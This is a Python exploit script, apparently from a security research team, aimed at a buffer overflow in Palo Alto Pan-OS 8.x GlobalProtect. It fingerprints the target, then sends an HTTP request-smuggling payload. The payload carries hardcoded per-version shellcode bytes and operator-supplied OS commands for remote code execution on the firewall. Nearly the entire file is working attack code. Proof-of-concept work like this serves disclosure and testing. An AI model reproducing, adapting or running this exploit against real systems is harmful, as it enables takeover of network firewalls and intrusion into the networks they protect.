#!/usr/bin/env python3

#
# Bishop Fox Cosmos Team
# Pan-OS 8.x_vm buffer overflow exploit 
#
# 4/25/2022
#
# Run: ./pan-bof-exploit.py
#

import threading
import ssl
import socket
import re
import sys
import time

# Add new versions here
versions = {
	#
	#"8.1.17_vm": "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x48\xc7\xc7\x55\x97\x0c\x01\xff\xe2\x90\x90\x48\xba\xb0\x76\x01\xf7\xff\x7f\xff\xff\x48\xc1\xe2\x10\x48\xc1\xea\x10\xeb\xe1\xe3\x40\x48\xe6\xff\x7f",
	"8.1.17_vm": "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x48\xc7\xc7\xca\x97\x0c\x01\xff\xe2\x90\x90\x48\xba\xb0\x76\x01\xf7\xff\x7f\xff\xff\x48\xc1\xe2\x10\x48\xc1\xea\x10\xeb\xe1\xe3\x40\x48\xe6\xff\x7f",
	"8.1.16_vm": "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x48\xc7\xc7\xca\x97\x0c\x01\xff\xe2\x90\x90\x48\xba\xb0\x76\x01\xf7\xff\x7f\xff\xff\x48\xc1\xe2\x10\x48\xc1\xea\x10\xeb\xe1\xab\x90\x48\xe6\xff\x7f",
	"8.1.12_vm": "",
	"8.1.8_MIPS": ""
}
selectedVersion = "8.1.16_vm"
numThreads = 1

# The good stuff
payload = \
	"HEAD /clientcert-info.sslvpn?cert_valid=true&cert_user=foo&cert_present=bar&cert_hostid=12345 HTTP/1.1\r\n"\
	"Transfer-Encoding\r\n"\
	"Connection: keep-alive\r\n"\
	"Content-length:LLLLL\r\n"\
	"\r\n"
smuggledRequest = \
	"GET /clientcert-info.sslvpn?cert_valid=true&cert_user=foo&cert_present=bar&cert_hostid=12345 HTTP/1.0\r\n"\
	"X-Real-IP: XXXXX\r\n"\
	"X-Real-PORT: YYYYY\r\n"\
	"\r\n"\
	"HAXX\r\n"\
	"\r\n"

# Handle command-line
if len(sys.argv) != 3:
	print("%s host[:port] -t | 'OS commands to execute'" % sys.argv[0])
	print("\nSpecify either '-t' or commands to execute.")
	print("Using -t will test for vulnerability without attempting the exploit.")
	exit(1)

host = sys.argv[1]
if ':' in host:
	(host, port) = host.split(':')
	port = int(port)
else:
	host = sys.argv[1]
	port = 20077

attemptExploit = True
if sys.argv[2] == '-t':
	attemptExploit = False


def getConnectedSocket(host, port):
	# Setup SSL
	ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
	ctx.check_hostname = False
	ctx.verify_mode = ssl.CERT_NONE
	tcpSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
	sslSock = ctx.wrap_socket(tcpSock, server_hostname=host)

	# Try SSL. Fall back to clear text if it fails.
	sock = sslSock
	try:
		sock.connect((host, port))
	except ssl.SSLError:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
		try:
			sock.connect((host, port))
		except:
			print("ERROR: couldn't connect to %s:%d" % (host, port))
			exit(1)

	return sock


# Helper to send bytes to a socket and read a response
def send_recieve(sock, data):
	try:
		sock.sendall(data)
		return sock.recv(4096).decode().split('\r\n')
	except Exception as e:
		print("send_receive exception: ", e)
		return None

def is_vulnerable(host, port):
	# connect to remote server
	sock = getConnectedSocket(host, port)

	# send request designed to elicit "Invalid input"
	payload = "GET /clientcert-info.sslvpn? HTTP/1.1\r\n\r\n".encode('raw_unicode_escape')
	r = send_recieve(sock, payload)

	if (r == None) or (not "HTTP/1.1 552 Custom error" in r):
		reason = "Not vulnerable: doesn't look like Palo Alto Global Protect"
		return (False, reason)

	if not "<p>Invalid input: /clientcert-info.sslvpn</p>" in r:
		reason = "Not vulnerable: didn't receive expected response ('Invalid input') from Global Protect"
		return (False, reason)

	# send request that will pass for <= 8.1.16, but error with "Invalid input" for >= 8.1.17
	payload = "GET /clientcert-info.sslvpn?cert_valid=true&cert_user=foo&cert_present=bar&cert_hostid=12345 HTTP/1.1\r\n\r\n".encode('raw_unicode_escape')
	r = send_recieve(sock, payload)

	if (r == None) or (not "HTTP/1.1 552 Custom error" in r):
		reason = "Not vulnerable: didn't receive expected response ('HTTP/1.1 552 Custom error')"
		return (False, reason)

	if "<p>Invalid input: /clientcert-info.sslvpn</p>" in r:
		reason = "Not vulnerable: found Pan-OS version >= 8.1.17"
		return (False, reason)
	
	if "Transfer-Encoding: chunked" in r:
		if "Connection: keep-alive" in r:
			if "Content-Type: text/html" in r:
				return (True, "Vulnerable!")

	return (False, "Not vulnerable? Unknown. Response: %s" % str(r))

def do_exploit(id):
	global payload, host, port

	print("[+] do_exploit(%d) [%s:%d]" % (id, host, port))
	try:
		sock = getConnectedSocket(host, port)	
		sock.send(payload.encode('raw_unicode_escape'))
	
		# Read firewall response
		#print("[+] Read response")
		r = sock.recv(512).decode().split('\r\n')
		response = "\n".join(r)
		sock.close()
	except Exception as e:
		print("\nException: ", e)

	# If we get a response matching the following parameters, then the exploit
	# was _probably_ successful. Or it crashed the remote process. Figure it out ;)
	if "HTTP/1.1 400 Bad Request" in response and "Content-Length: 176" in response:
		print("[+] Received the expected response! Exploit appears successful.")
		exit(0)
	else:
		#print("[!] Did NOT receive the expected response.\n\n%s" % response)
		exit(1)


# Test vuln before trying the exploit
print("[+] Testing to see if %s is vulnerable..." % host)
(status, reason) = is_vulnerable(host, port)
if status == False:
	print("[!] %s" % reason)
	exit(2)

if attemptExploit == False:
	print("[+] %s" % reason)
	exit(0)

# Do it for real!
print("[+] %s appears to be vulnerable. Trying the exploit!" % host)

# Populate our payload buffer
smuggledRequest = smuggledRequest.replace("XXXXX", versions[selectedVersion])
smuggledRequest = smuggledRequest.replace("YYYYY", sys.argv[2])
payload = payload.replace("LLLLL", str(len(smuggledRequest)))
payload = payload + smuggledRequest

# Use as many threads as necessary. Default = 1.
print("[+] Sending payloads...")
threads = list()
for i in range(numThreads):
	t = threading.Thread(target=do_exploit, args=(i,))
	threads.append(t)
	t.start()

print("[+] Payloads sent. Wait a sec...")

for i, t in enumerate(threads):
	t.join()

print("[+] All done. Check your shells!")